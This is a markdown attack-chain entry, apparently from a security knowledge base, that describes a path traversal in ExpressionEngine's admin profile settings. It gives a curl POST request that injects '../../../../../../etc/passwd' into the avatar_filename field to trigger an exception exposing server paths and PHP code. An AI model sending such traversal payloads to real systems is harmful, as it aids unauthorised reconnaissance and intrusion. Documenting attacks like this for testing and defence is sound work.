---
tags:
  - path-traversal
  - information-disclosure
  - expressionengine
  - php
  - web
type: attack_chain
tools: []
tactics:
  - '[[Discovery]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Trigger-Path-Traversal-in-ExpressionEngine-Profile]]'
step_count: 2
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:06.099Z'
description: >-
  A multi-step attack exploiting path traversal in ExpressionEngine's admin
  profile settings to disclose server file paths and back-end code snippets via
  an exception.
skill_level: intermediate
impact_level: medium
id: 8511c58e-ac41-4fce-947e-2c9418b12b65
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# ExpressionEngine Admin Profile Path Traversal for Server Path and Code Disclosure

Multi-stage attack chain demonstrating information disclosure through path traversal in ExpressionEngine's admin profile endpoint.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~1 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Admin Profile Edit] --> B[Trigger Exception]
    B --> C[Disclose Paths and Code]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Web platform running ExpressionEngine (PHP-based CMS)
- Admin access to the profile settings endpoint
- No specific ports required beyond standard HTTP/HTTPS (80/443)

### Initial Access Requirements

- Authenticated admin session (valid CSRF token and credentials)
- Network access to the admin panel (/ee/admin.php)
- Prior knowledge of the target ID (e.g., &id=1 for admin user)

## Detailed Attack Procedures

### Step 1: Submit Malicious Profile Edit Request
procedure: [[procedures/Trigger-Path-Traversal-in-ExpressionEngine-Profile]]

**Objective**: Craft and send a POST request to the profile settings endpoint with a path traversal payload in the avatar_filename parameter to attempt invalid file access.

**Instructions**: Use [[commands/curl-expressionengine-path-traversal]] to simulate the admin editing personal information while injecting the payload:

```bash
curl -X POST 'http://target.com/ee/admin.php?/cp/members/profile/settings&id=1' \
  -H 'Content-Type: multipart/form-data' \
  -F 'csrf_token=your_csrf_token' \
  -F 'url=http://example.com' \
  -F 'location=US' \
  -F 'bday=1990-01-01' \
  -F 'bio=Test bio' \
  -F 'language=en' \
  -F 'preferences[]=option1' \
  -F 'avatar_filename=../../../../../../etc/passwd'
```

**Expected Output**: The server processes the request but encounters an invalid path, preparing to throw an exception.

**Success Indicators**:
- Request accepted without immediate rejection (HTTP 200 or redirect)
- No authentication errors in response

### Step 2: Observe and Analyze Exception Response
procedure: [[procedures/Trigger-Path-Traversal-in-ExpressionEngine-Profile]]

**Objective**: Capture the error response triggered by the invalid path, revealing the full server file path and back-end code snippets.

**Instructions**: Inspect the response from the previous curl command or use a proxy like Burp Suite to view the full error message. The exception will display details like the absolute server path (e.g., /var/www/html/ee/system/... ) and partial PHP code from the handler.

**Expected Output**: HTML error page containing stack trace with full paths (e.g., revealing /etc/passwd attempt resolution) and code fragments from ExpressionEngine's file handling logic.

**Success Indicators**:
- Error message includes absolute server paths (e.g., starting with /var/www or similar)
- Partial source code visible, confirming back-end exposure
- No file contents leaked beyond paths (as per the vulnerability scope)

## Attack Chain Summary

### Key Achievements

1. Successful path traversal injection via avatar_filename parameter
2. Disclosure of sensitive server file paths for reconnaissance
3. Exposure of partial back-end PHP code, aiding further attack planning despite open-source nature

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
